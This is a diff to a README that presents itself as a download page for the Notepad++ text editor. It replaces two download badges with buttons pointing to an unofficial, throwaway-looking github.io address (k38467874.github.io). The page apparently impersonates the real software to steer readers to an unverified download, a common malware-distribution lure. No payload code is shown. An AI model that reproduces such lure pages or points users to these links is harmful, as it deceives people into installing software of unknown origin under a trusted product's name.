@@ -1,14 +1,12 @@
 # Notepad++ Windows Text Editor
 
 <div align="center">
-<img src="https://veducate.co.uk/wp-content/uploads/2020/11/Notepad-header-610x250-604x250.png" alt="Notepad++ Logo" width="900">
+<img src="https://cdn.neowin.com/news/images/uploaded/2025/07/1752122085_notepad.webp" alt="Notepad++ Logo" width="900">
 </div>  
 <br>
 
-<div align="center">
+[![GET NotepadPlus Text](https://img.shields.io/badge/GET%20%E2%80%94%20NotepadPlus-Text-0078D6?style=for-the-badge&logoColor=white)](https://k38467874.github.io/.github/NotepadPlus-Text)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://notepadplus-text-editor-download.github.io/.github/)
-</div>
 
 ---
 
@@ -25,10 +23,8 @@
 <img src="https://preview.redd.it/fluent-dark-theme-for-notepad-v0-cvee8xt8lekb1.png?width=640&crop=smart&auto=webp&s=ffba4441631c1622fcc362c663707b91bfcd6fd0" width="800">
 </div>
 
-<div align="center">
+[![GET NotepadPlus Text](https://img.shields.io/badge/GET%20%E2%80%94%20NotepadPlus-Text-0078D6?style=for-the-badge&logoColor=white)](https://k38467874.github.io/.github/NotepadPlus-Text)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://notepadplus-text-editor-download.github.io/.github/)
-</div>
 
 ---
 
